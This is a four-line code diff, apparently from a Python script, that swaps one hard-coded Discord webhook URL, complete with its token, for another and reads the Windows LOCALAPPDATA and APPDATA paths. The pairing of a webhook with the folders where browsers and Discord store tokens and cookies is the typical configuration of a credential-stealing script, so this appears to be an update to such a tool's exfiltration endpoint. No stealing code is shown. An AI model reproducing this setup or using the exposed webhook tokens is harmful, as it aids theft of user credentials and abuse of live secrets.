@@ -1,4 +1,4 @@
-webhook = "https://discord.com/api/webhooks/1552126592480841819/8CPld6L6LApYcwYxRdtNqeFZB5Bu2O06vTjkqo_ZaSmb-lvTvGO3Xmb3Bus87bHYjF4I"
+webhook = "https://discord.com/api/webhooks/1572412484722360341/D4UtWHCa8-IXArawpBqEYSM33IPiW-ToHYpobJufbrhE9jgEP1B4R65xogdAWxJBsxNi"
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
